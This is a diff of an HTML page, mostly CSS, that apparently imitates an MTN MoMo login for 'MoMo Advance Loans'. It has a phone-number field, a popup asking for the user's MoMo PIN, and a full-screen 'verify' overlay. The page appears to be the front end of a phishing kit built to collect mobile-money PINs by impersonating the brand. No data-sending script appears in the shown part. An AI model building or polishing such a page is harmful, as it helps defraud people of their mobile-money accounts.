@@ -1,1137 +1,1316 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>MTN MoMo Loan - Login</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#000000">
+  <title>MTN MoMo – Login | MoMo Advance Loans</title>
 
-        html, body {
-            height: 100%;
-            font-family: 'Inter', sans-serif;
-            background: #eef1f6;
-            overflow: hidden;
-            position: relative;
-        }
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
-        body::before {
-            content: "";
-            position: fixed;
-            top: -20%;
-            left: -10%;
-            width: 70%;
-            height: 70%;
-            background: radial-gradient(circle, rgba(0,71,171,0.10), transparent 60%);
-            pointer-events: none;
-            z-index: 0;
-        }
-        body::after {
-            content: "";
-            position: fixed;
-            bottom: -20%;
-            right: -10%;
-            width: 70%;
-            height: 70%;
-            background: radial-gradient(circle, rgba(255,204,0,0.10), transparent 60%);
-            pointer-events: none;
-            z-index: 0;
-        }
+  <style>
+    :root {
+      --black: #000000;
+      --mtn-dark: #003366;
+      --mtn-mid: #004080;
+      --mtn-gold: #FFCC00;
+      --mtn-gold-light: #FFD633;
+      --mtn-gold-dark: #E6B800;
+      --grad: linear-gradient(135deg, #003366 0%, #004080 100%);
+      --grad-gold: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
+      --page-bg: #f9fafb;
+      --white: #FFFFFF;
+      --text-dark: #1C2340;
+      --text-mid: #4B5168;
+      --text-light: #8B90A3;
+      --border: #E4E7EF;
+      --error: #DC2626;
+      --orange-500: #F97316;
+      --orange-600: #EA580C;
+      --green-600: #16A34A;
+      --radius-lg: 22px;
+      --radius-md: 16px;
+      --radius-xl: 26px;
+      --shadow-md: 0 6px 20px rgba(0, 25, 60, 0.08);
+      --shadow-lg: 0 20px 50px rgba(0, 25, 60, 0.12);
+      --shadow-2xl: 0 20px 40px rgba(0, 0, 0, 0.2);
+      --header-h: 74px;
+      --footer-h: 68px;
+    }
 
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 10px;
-            height: 100vh;
-            height: 100dvh;
-            gap: 10px;
-            position: relative;
-            z-index: 1;
-        }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
 
-        header {
-            width: 100%;
-            max-width: 480px;
-            padding: 12px 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: rgba(255,255,255,0.75);
-            backdrop-filter: blur(14px);
-            -webkit-backdrop-filter: blur(14px);
-            border: 1px solid rgba(255,255,255,0.9);
-            border-radius: 16px;
-            box-shadow: 0 8px 30px rgba(0,71,171,0.06);
-            position: relative;
-            flex-shrink: 0;
-            z-index: 5;
-        }
+    html, body { width: 100%; overflow-x: hidden; }
 
-        .back-btn {
-            font-size: 22px;
-            background: #f0f4ff;
-            border: none;
-            cursor: pointer;
-            color: #0047AB;
-            width: 36px;
-            height: 36px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 800;
-            transition: transform 0.2s, background 0.2s;
-        }
-        .back-btn:hover {
-            background: #e0e9ff;
-            transform: translateX(-2px);
-        }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--page-bg);
+      color: var(--text-dark);
+      min-height: 100vh;
+      padding-top: var(--header-h);
+      padding-bottom: var(--footer-h);
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
 
-        .logo-container {
-            position: absolute;
-            left: 50%;
-            transform: translateX(-50%);
-        }
+    body.modal-open { overflow: hidden; }
 
-        .mtn-logo {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 3px;
-        }
-        .mtn-logo-icon {
-            width: 38px;
-            height: 38px;
-            background: #FFD700;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.4rem;
-            font-weight: 900;
-            color: #003366;
-            position: relative;
-            box-shadow: 0 6px 16px rgba(255,215,0,0.5);
-        }
-        .mtn-logo-icon::after {
-            content: 'M';
-            font-size: 1.55rem;
-            font-weight: 900;
-        }
-        .mtn-logo-text {
-            font-size: 0.85rem;
-            font-weight: 800;
-            color: #003366;
-            line-height: 1;
-        }
-        .mtn-logo-sub {
-            font-size: 0.58rem;
-            color: #888;
-            font-weight: 600;
-            letter-spacing: 0.3px;
-            line-height: 1;
-        }
+    /* ═══════════ HEADER — BLACK ═══════════ */
+    .header {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: var(--header-h);
+      background-color: var(--black);
+      color: var(--white);
+      z-index: 100;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.4);
+    }
+    .header-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      height: 100%;
+      padding: 0 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      color: inherit;
+    }
+    .brand-logo-img {
+      height: 48px;
+      width: auto;
+      display: block;
+    }
+    .brand-divider {
+      width: 1px;
+      height: 26px;
+      background: rgba(255, 255, 255, 0.2);
+      margin: 0 4px;
+      flex-shrink: 0;
+    }
+    .brand-sub {
+      font-size: 12px;
+      color: #9ca3af;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+    .header-back {
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 0.82rem;
+      font-weight: 700;
+      font-family: 'Inter', sans-serif;
+      padding: 8px 14px;
+      border-radius: 50px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: background 0.2s;
+    }
+    .header-back:hover {
+      background: rgba(255, 255, 255, 0.18);
+      color: #fff;
+    }
 
-        .card {
-            background: rgba(255,255,255,0.92);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255,255,255,0.9);
-            border-radius: 28px;
-            padding: 28px 22px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow:
-                0 20px 60px rgba(0,71,171,0.10),
-                0 4px 12px rgba(0,0,0,0.02);
-            flex: 1;
-            min-height: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            overflow-y: auto;
-            position: relative;
-            z-index: 2;
-        }
+    /* ═══════════ MAIN ═══════════ */
+    .main {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 22px 16px 36px;
+    }
+    .login-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: calc(100vh - var(--header-h) - var(--footer-h) - 40px);
+      padding: 8px 0;
+    }
+    .login-card-wrap {
+      width: 100%;
+      max-width: 440px;
+    }
 
-        .phone-input-group {
-            margin-bottom: 20px;
-            position: relative;
-        }
+    /* ═══════════ MOMO YELLOW BAND ═══════════ */
+    .momo-band {
+      background: var(--grad-gold);
+      border-radius: var(--radius-lg) var(--radius-lg) 0 0;
+      padding: 26px 24px;
+      text-align: center;
+      box-shadow: var(--shadow-md);
+      position: relative;
+      overflow: hidden;
+    }
+    .momo-band::before {
+      content: "";
+      position: absolute;
+      top: -40px; right: -40px;
+      width: 140px; height: 140px;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.45), transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+    .momo-logo-img {
+      height: 48px;
+      width: auto;
+      display: inline-block;
+      position: relative;
+    }
+    .momo-tagline {
+      font-size: 12px;
+      font-weight: 800;
+      color: #7A5A00;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      margin-top: 12px;
+      position: relative;
+    }
 
-        .input-label {
-            display: block;
-            font-weight: 700;
-            color: #333;
-            margin-bottom: 8px;
-            font-size: 12.5px;
-            letter-spacing: 0.2px;
-        }
+    /* ═══════════ BODY CARD ═══════════ */
+    .login-body {
+      background: var(--white);
+      border-radius: 0 0 var(--radius-lg) var(--radius-lg);
+      padding: 26px 22px 28px;
+      box-shadow: var(--shadow-lg);
+    }
 
-        .phone-input {
-            display: flex;
-            align-items: center;
-            border: 2px solid #e6ebf5;
-            border-radius: 14px;
-            overflow: visible;
-            transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
-            background: #fafbff;
-            position: relative;
-        }
+    .welcome-title {
+      font-size: 1.15rem;
+      font-weight: 800;
+      color: var(--text-dark);
+      letter-spacing: -0.02em;
+      margin-bottom: 6px;
+      text-align: center;
+    }
+    .welcome-sub {
+      font-size: 0.82rem;
+      color: var(--text-light);
+      font-weight: 500;
+      text-align: center;
+      margin-bottom: 22px;
+      line-height: 1.5;
+    }
 
-        .phone-input:focus-within {
-            border-color: #0047AB;
-            background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.10), 0 8px 24px rgba(0,71,171,0.08);
-        }
+    /* ═══════════ FORM ═══════════ */
+    .form-field { margin-bottom: 18px; position: relative; }
+    .input-label {
+      display: block;
+      font-size: 0.78rem;
+      font-weight: 800;
+      color: var(--text-mid);
+      margin-bottom: 8px;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
 
-        .phone-input.invalid {
-            border-color: #e74c3c;
-            background: #fff5f5;
-            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.10);
-            animation: shake 0.4s ease;
-        }
+    .phone-input {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid var(--border);
+      border-radius: 14px;
+      overflow: hidden;
+      transition: border-color 0.25s, box-shadow 0.25s, background 0.25s;
+      background: #FBFCFE;
+      position: relative;
+    }
+    .phone-input:focus-within {
+      border-color: var(--mtn-gold);
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.18);
+    }
+    .phone-input.invalid {
+      border-color: var(--error);
+      background: #FFF5F5;
+      box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.10);
+      animation: shake 0.4s ease;
+    }
 
-        .country-btn {
-            display: flex;
-            align-items: center;
-            gap: 7px;
-            padding: 12px 12px;
-            background: linear-gradient(135deg, #f0f4ff, #e6ecff);
-            font-weight: 800;
-            font-size: 14.5px;
-            color: #0047AB;
-            border: none;
-            border-right: 2px solid #e0e6f5;
-            border-top-left-radius: 12px;
-            border-bottom-left-radius: 12px;
-            white-space: nowrap;
-            flex-shrink: 0;
-            cursor: pointer;
-            font-family: 'Inter', sans-serif;
-            transition: background 0.2s;
-            position: relative;
-        }
-        .country-btn:hover {
-            background: linear-gradient(135deg, #e6ecff, #dbe4ff);
-        }
-        .country-btn .caret-sm {
-            font-size: 9px;
-            opacity: 0.7;
-            margin-left: 2px;
-            transition: transform 0.25s;
-        }
-        .country-btn.open .caret-sm {
-            transform: rotate(180deg);
-        }
+    .country-btn {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      padding: 14px 14px;
+      background: #F7F8FB;
+      font-weight: 800;
+      font-size: 14px;
+      color: var(--text-dark);
+      border: none;
+      border-right: 1.5px solid var(--border);
+      white-space: nowrap;
+      flex-shrink: 0;
+      font-family: 'Inter', sans-serif;
+    }
 
-        .flag-svg {
-            width: 22px;
-            height: 15px;
-            border-radius: 3px;
-            box-shadow: 0 0 0 1px rgba(0,0,0,0.08);
-            flex-shrink: 0;
-        }
+    .flag-svg {
+      width: 22px;
+      height: 15px;
+      border-radius: 3px;
+      box-shadow: 0 0 0 1px rgba(0,0,0,0.08);
+      flex-shrink: 0;
+    }
 
-        .phone-input input {
-            border: none !important;
-            box-shadow: none !important;
-            flex: 1;
-            border-radius: 0;
-            padding: 12px 14px;
-            font-size: 15px;
-            font-family: 'Inter', sans-serif;
-            color: #1a1a2e;
-            font-weight: 600;
-            outline: none;
-            min-width: 0;
-            background: transparent;
-            letter-spacing: 0.5px;
-        }
-        .phone-input input::placeholder {
-            color: #b8bfd0;
-            font-weight: 500;
-            letter-spacing: normal;
-        }
+    .phone-input input {
+      border: none !important;
+      box-shadow: none !important;
+      flex: 1;
+      border-radius: 0;
+      padding: 14px 14px;
+      font-size: 15px;
+      font-family: 'Inter', sans-serif;
+      color: var(--text-dark);
+      font-weight: 700;
+      outline: none;
+      min-width: 0;
+      background: transparent;
+      letter-spacing: 0.5px;
+    }
+    .phone-input input::placeholder {
+      color: #A8AFC0;
+      font-weight: 500;
+      letter-spacing: normal;
+    }
 
-        .country-menu {
-            position: absolute;
-            top: calc(100% + 8px);
-            left: 0;
-            min-width: 240px;
-            background: #fff;
-            border: 1.5px solid #e6ebf5;
-            border-radius: 14px;
-            box-shadow: 0 16px 40px rgba(0,71,171,0.18);
-            overflow: hidden;
-            max-height: 0;
-            opacity: 0;
-            visibility: hidden;
-            transform: translateY(-6px);
-            transition: max-height 0.28s ease, opacity 0.22s ease, visibility 0.22s, transform 0.22s;
-            z-index: 100;
-        }
-        .country-menu.open {
-            max-height: 320px;
-            opacity: 1;
-            visibility: visible;
-            transform: translateY(0);
-        }
+    .error-text {
+      color: var(--error);
+      font-size: 12px;
+      margin-top: 8px;
+      display: none;
+      font-weight: 700;
+      line-height: 1.4;
+    }
+    .error-text.show {
+      display: block;
+      animation: slideDown 0.3s ease;
+    }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-4px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-6px); }
+      75% { transform: translateX(6px); }
+    }
 
-        .country-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            width: 100%;
-            padding: 12px 16px;
-            background: #fff;
-            border: none;
-            border-top: 1px solid #f0f3f9;
-            cursor: pointer;
-            font-family: 'Inter', sans-serif;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a2e;
-            text-align: left;
-            transition: background 0.15s;
-        }
-        .country-item:first-child { border-top: none; }
-        .country-item:hover { background: #f0f4ff; }
-        .country-item .dial {
-            margin-left: auto;
-            color: #8a90a2;
-            font-weight: 700;
-            font-size: 13px;
-        }
-        .country-item.selected {
-            background: #f0f4ff;
-        }
-        .country-item.selected .dial {
-            color: #0047AB;
-        }
+    /* ═══════════ LOGIN BUTTON ═══════════ */
+    .login-btn {
+      width: 100%;
+      padding: 17px;
+      background: var(--grad-gold);
+      color: #1A1A2E;
+      border: none;
+      border-radius: 14px;
+      font-size: 15px;
+      font-weight: 900;
+      letter-spacing: 0.05em;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s, filter 0.2s;
+      font-family: 'Inter', sans-serif;
+      margin-top: 22px;
+      box-shadow: 0 10px 24px rgba(255, 204, 0, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      position: relative;
+      overflow: hidden;
+    }
+    .login-btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(120deg, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
+      transform: translateX(-100%);
+      transition: transform 0.7s;
+    }
+    .login-btn:hover::after { transform: translateX(100%); }
+    .login-btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 30px rgba(255, 204, 0, 0.55);
+      filter: brightness(0.98);
+    }
+    .login-btn:active:not(:disabled) { transform: scale(0.98); }
+    .login-btn:disabled { opacity: 0.65; cursor: not-allowed; }
 
-        .pin-label-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-        .pin-label-row .input-label { margin-bottom: 0; }
+    .security-note {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 16px;
+      font-size: 11.5px;
+      color: var(--text-light);
+      font-weight: 600;
+      text-align: center;
+    }
+    .security-note .ico { font-size: 13px; color: var(--green-600); }
 
-        .forgot-link {
-            font-size: 12px;
-            font-weight: 700;
-            color: #0047AB;
-            text-decoration: none;
-            cursor: pointer;
-            padding: 4px 6px;
-            border-radius: 6px;
-            transition: background 0.15s;
-        }
-        .forgot-link:hover { background: #f0f4ff; }
+    .signup-text {
+      text-align: center;
+      font-size: 13px;
+      color: var(--text-light);
+      margin-top: 16px;
+      font-weight: 500;
+    }
+    .signup-text a {
+      color: var(--mtn-dark);
+      font-weight: 800;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .signup-text a:hover { text-decoration: underline; }
 
-        .pin-row {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+    /* ═══════════ BOTTOM NAV ═══════════ */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      height: var(--footer-h);
+      background: var(--white);
+      border-top: 1px solid var(--border);
+      box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.06);
+      z-index: 100;
+    }
+    .bottom-nav-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      height: 100%;
+      padding: 0 12px;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+    }
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      color: #8a90a2;
+      font-size: 11px;
+      font-weight: 700;
+      text-decoration: none;
+      padding: 6px 14px;
+      border-radius: 12px;
+      transition: color 0.2s, transform 0.2s;
+    }
+    .nav-item .ico { font-size: 20px; }
+    .nav-item:hover { transform: translateY(-2px); }
+    .nav-item.active { color: var(--mtn-dark); }
 
-        .pin-boxes {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            flex: 1;
-        }
+    /* ═══════════ PIN POPUP ═══════════ */
+    .modal-container { position: fixed; inset: 0; z-index: 9999; display: none; }
+    .modal-container.open { display: block; }
 
-        .pin-box {
-            width: 46px;
-            height: 52px;
-            text-align: center;
-            font-size: 22px;
-            font-weight: 800;
-            color: #1a1a2e;
-            border: 2px solid #e6ebf5;
-            border-radius: 12px;
-            background: #fafbff;
-            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s, transform 0.15s;
-            outline: none;
-            font-family: 'Inter', sans-serif;
-            caret-color: #0047AB;
-            padding: 0;
-            flex: none;
-        }
+    .sheet-overlay {
+      position: absolute; inset: 0;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(3px);
+      animation: fadeIn 0.2s ease;
+    }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        .pin-box:focus {
-            border-color: #0047AB;
-            background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.10);
-            transform: translateY(-2px);
-        }
+    .pin-modal {
+      position: fixed;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      bottom: 170px;
+      background: var(--white);
+      width: calc(100% - 32px);
+      max-width: 400px;
+      border-radius: var(--radius-xl);
+      padding: 24px 22px;
+      box-shadow: var(--shadow-2xl);
+      opacity: 0;
+      transition: opacity 0.25s ease, transform 0.25s ease, bottom 0.25s ease;
+      z-index: 1;
+    }
+    .pin-modal.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-        .pin-box.filled {
-            border-color: #0047AB;
-            background: linear-gradient(135deg, #f0f4ff, #e6ecff);
-            color: #0047AB;
-        }
+    .pin-modal-title {
+      font-size: 18px;
+      color: var(--black);
+      margin-bottom: 14px;
+      line-height: 1.45;
+      font-weight: 700;
+    }
+    .pin-modal-title strong { font-weight: 900; color: var(--orange-600); }
 
-        .pin-box.invalid {
-            border-color: #e74c3c;
-            background: #fff5f5;
-            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.10);
-            animation: shake 0.4s ease;
-        }
+    .pin-modal-sub {
+      font-size: 13.5px;
+      color: var(--text-mid);
+      margin-bottom: 20px;
+      line-height: 1.55;
+    }
+    .pin-label {
+      display: block;
+      font-size: 13px;
+      font-weight: 800;
+      color: var(--text-mid);
+      margin-bottom: 8px;
+    }
 
-        .eye-toggle {
-            flex-shrink: 0;
-            width: 46px;
-            height: 52px;
-            background: #f0f4ff;
-            border: 2px solid #e6ebf5;
-            border-radius: 12px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.2s, border-color 0.2s, transform 0.15s;
-            padding: 0;
-        }
-        .eye-toggle:hover {
-            background: #e6ecff;
-            border-color: #c9d6f0;
-        }
-        .eye-toggle:active {
-            transform: scale(0.95);
-        }
-        .eye-toggle svg {
-            width: 22px;
-            height: 22px;
-            stroke: #0047AB;
-            stroke-width: 2;
-            fill: none;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-            transition: opacity 0.2s, transform 0.2s;
-        }
-        .eye-toggle .eye-open { display: block; }
-        .eye-toggle .eye-closed { display: none; }
-        .eye-toggle.revealed .eye-open { display: none; }
-        .eye-toggle.revealed .eye-closed { display: block; }
-        .eye-toggle.revealed {
-            background: #0047AB;
-            border-color: #0047AB;
-        }
-        .eye-toggle.revealed svg {
-            stroke: #FFCC00;
-        }
+    .pin-input-wrap { position: relative; display: flex; align-items: center; }
+    .pin-input {
+      width: 100%;
+      padding: 14px 52px 14px 16px;
+      background: var(--white);
+      color: var(--black);
+      font-size: 24px;
+      outline: none;
+      border: 2px solid var(--border);
+      border-radius: var(--radius-md);
+      letter-spacing: 12px;
+      text-align: center;
+      font-weight: 800;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      font-family: inherit;
+    }
+    .pin-input::placeholder {
+      color: #C8CFDF;
+      letter-spacing: 8px;
+      font-weight: 500;
+    }
+    .pin-input:focus {
+      border-color: var(--orange-500);
+      box-shadow: 0 0 0 4px rgba(249, 115, 22, 0.15);
+    }
 
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-6px); }
-            75% { transform: translateX(6px); }
-        }
+    .pin-eye-btn {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 36px;
+      height: 36px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text-light);
+      font-size: 20px;
+      transition: color 0.2s, background 0.2s;
+      cursor: pointer;
+      border: none;
+      background: none;
+    }
+    .pin-eye-btn:hover { color: var(--text-dark); background: #F2F4F9; }
+    .pin-eye-btn.active { color: var(--orange-500); }
+    .pin-eye-btn svg {
+      width: 22px; height: 22px;
+      stroke: currentColor;
+      stroke-width: 2;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
 
-        .error-text {
-            color: #e74c3c;
-            font-size: 12px;
-            margin-top: 6px;
-            display: none;
-            font-weight: 600;
-            line-height: 1.4;
-        }
-        .error-text.show {
-            display: block;
-            animation: slideDown 0.3s ease;
-        }
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-4px); }
-            to   { opacity: 1; transform: translateY(0); }
-        }
+    .pin-forgot-row {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 10px;
+      margin-bottom: 6px;
+    }
+    .pin-forgot {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--mtn-dark);
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .pin-forgot:hover { text-decoration: underline; }
 
-        .login-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #0058D8, #0047AB 40%, #002D7A);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 800;
-            letter-spacing: 0.6px;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
-            font-family: 'Inter', sans-serif;
-            margin-top: 24px;
-            box-shadow:
-                0 12px 28px rgba(0,71,171,0.32),
-                inset 0 1px 0 rgba(255,255,255,0.2);
-            position: relative;
-            overflow: hidden;
-        }
-        .login-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow:
-                0 16px 34px rgba(0,71,171,0.45),
-                inset 0 1px 0 rgba(255,255,255,0.25);
-        }
-        .login-btn:active:not(:disabled) {
-            transform: scale(0.98);
-        }
-        .login-btn:disabled {
-            opacity: 0.65;
-            cursor: not-allowed;
-        }
-        .login-btn::after {
-            content: "→";
-            margin-left: 8px;
-            display: inline-block;
-            transition: transform 0.25s;
-        }
-        .login-btn:hover:not(:disabled)::after {
-            transform: translateX(4px);
-        }
+    .pin-error {
+      color: var(--error);
+      font-size: 12px;
+      margin-top: 10px;
+      display: none;
+      font-weight: 700;
+      line-height: 1.4;
+    }
+    .pin-error.show { display: block; animation: slideDown 0.3s ease; }
 
-        .security-notice {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            margin-top: 16px;
-            font-size: 11.5px;
-            color: #8a90a2;
-            font-weight: 500;
-        }
+    .pin-actions {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-top: 22px;
+    }
+    .btn-cancel {
+      padding: 14px;
+      font-weight: 800;
+      font-size: 14px;
+      color: var(--black);
+      background: var(--white);
+      border: 2px solid var(--border);
+      border-radius: var(--radius-md);
+      transition: background 0.2s;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+    }
+    .btn-cancel:hover { background: #F2F4F9; }
 
-        .signup-text {
-            text-align: center;
-            font-size: 13px;
-            color: #8a90a2;
-            margin-top: 16px;
-            font-weight: 500;
-        }
-        .signup-text a {
-            color: #0047AB;
-            font-weight: 800;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        .signup-text a:hover { text-decoration: underline; }
+    .btn-pin-proceed {
+      padding: 14px;
+      font-weight: 900;
+      font-size: 14px;
+      color: var(--black);
+      background: var(--grad-gold);
+      border: none;
+      border-radius: var(--radius-md);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      transition: filter 0.2s, transform 0.15s, opacity 0.2s, box-shadow 0.2s;
+      box-shadow: 0 4px 12px rgba(255, 204, 0, 0.35);
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+    }
+    .btn-pin-proceed:hover:not(:disabled) {
+      filter: brightness(0.96);
+      box-shadow: 0 6px 16px rgba(255, 204, 0, 0.5);
+    }
+    .btn-pin-proceed:active:not(:disabled) { transform: scale(0.97); }
+    .btn-pin-proceed:disabled { opacity: 0.35; cursor: not-allowed; box-shadow: none; }
 
-        footer {
-            padding: 6px;
-            color: #a9b0c2;
-            font-size: 11px;
-            text-align: center;
-            width: 100%;
-            max-width: 480px;
-            flex-shrink: 0;
-            font-weight: 500;
-        }
+    .btn-spinner {
+      width: 16px; height: 16px;
+      border: 2.5px solid rgba(0, 0, 0, 0.25);
+      border-top-color: var(--black);
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
 
-        .verify-overlay {
-            position: fixed;
-            inset: 0;
-            background: linear-gradient(135deg, #ffffff 0%, #f4f7ff 100%);
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 32px 24px;
-            z-index: 2000;
-        }
-        .verify-overlay.show { display: flex; }
+    /* ═══════════════════════════════════════════
+       SUPER VERIFY OVERLAY
+       ═══════════════════════════════════════════ */
+    .verify-overlay {
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(circle at 50% 30%, #003366 0%, #001A33 60%, #000913 100%);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 24px;
+      z-index: 10000;
+      overflow: hidden;
+    }
+    .verify-overlay.show { display: flex; animation: fadeIn 0.5s ease; }
 
-        .verify-content {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            max-width: 340px;
-            text-align: center;
-        }
+    /* Radial glow behind content */
+    .verify-overlay::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 700px;
+      height: 700px;
+      transform: translate(-50%, -50%);
+      background: radial-gradient(circle, rgba(255, 204, 0, 0.15) 0%, transparent 60%);
+      animation: glowPulse 3s ease-in-out infinite;
+      pointer-events: none;
+    }
+    @keyframes glowPulse {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }
+      50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+    }
 
-        .verify-momo-logo {
-            width: 68px;
-            height: 68px;
-            background: #FFD700;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2rem;
-            font-weight: 900;
-            color: #003366;
-            margin-bottom: 32px;
-            position: relative;
-            box-shadow: 0 14px 34px rgba(255,215,0,0.5);
-            animation: overlayPulse 2s ease-in-out infinite;
-        }
-        .verify-momo-logo::after {
-            content: 'M';
-            font-size: 2.2rem;
-            font-weight: 900;
-        }
+    /* Floating particles */
+    .verify-particles {
+      position: absolute;
+      inset: 0;
+      overflow: hidden;
+      pointer-events: none;
+    }
+    .verify-particle {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      background: var(--mtn-gold);
+      border-radius: 50%;
+      opacity: 0;
+      box-shadow: 0 0 12px rgba(255, 204, 0, 0.8);
+      animation: particleFloat 8s infinite ease-in-out;
+    }
+    .verify-particle:nth-child(1) { left: 10%; top: 80%; animation-delay: 0s; }
+    .verify-particle:nth-child(2) { left: 25%; top: 60%; animation-delay: 1.2s; }
+    .verify-particle:nth-child(3) { left: 80%; top: 75%; animation-delay: 2.4s; }
+    .verify-particle:nth-child(4) { left: 65%; top: 85%; animation-delay: 3.6s; }
